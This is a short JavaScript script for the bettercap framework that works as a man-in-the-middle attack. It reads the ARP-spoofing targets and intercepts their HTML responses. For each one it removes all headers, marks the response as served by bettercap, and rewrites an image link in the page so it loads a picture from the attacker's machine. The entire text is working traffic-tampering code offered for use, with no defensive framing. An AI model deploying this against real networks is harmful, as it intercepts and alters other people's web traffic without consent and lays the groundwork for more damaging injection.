var serverIp, imageUrl, spoofTargets;

function onLoad() {
    serverIp = env['iface.ipv4']
    imageUrl = 'http://' + serverIp  + '/avatar.jpg'
    spoofTargets = env['arp.spoof.targets']

    log('Script loaded!')
    log("targets: " + spoofTargets)
    log("Server ip", serverIp)
}

function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        log('Replacing images.')

        headers = res.Headers.split("\r\n");
        for (var i = 0; i < headers.length; i++) {
            header_name = headers[i].replace(/:.*/, "");
            res.RemoveHeader(header_name);
        }

        res.SetHeader("Server", "bettercap");
        res.SetHeader("Connection", "close");
        
        var body = res.ReadBody()
        var modificatedBody = body.replace(/["'][https:\/\/]*[^\s]+\.(png|jpg|jpeg|bmp|gif|webp|svg)["']/i, imageUrl)
        res.Body = modificatedBody
    }
}
